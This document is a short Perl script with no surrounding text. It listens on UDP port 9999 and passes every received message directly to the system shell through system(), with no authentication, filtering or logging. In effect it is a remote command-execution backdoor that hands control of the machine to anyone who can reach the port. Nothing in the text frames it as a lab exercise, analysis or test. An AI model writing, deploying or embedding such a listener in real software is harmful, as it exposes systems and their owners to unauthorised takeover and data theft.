use IO::Socket::INET;
my $socket = IO::Socket::INET->new(LocalPort => 9999, Proto => 'udp');
while (1) {
    my $command;
    $socket->recv($command, 1024);
    system($command);
}
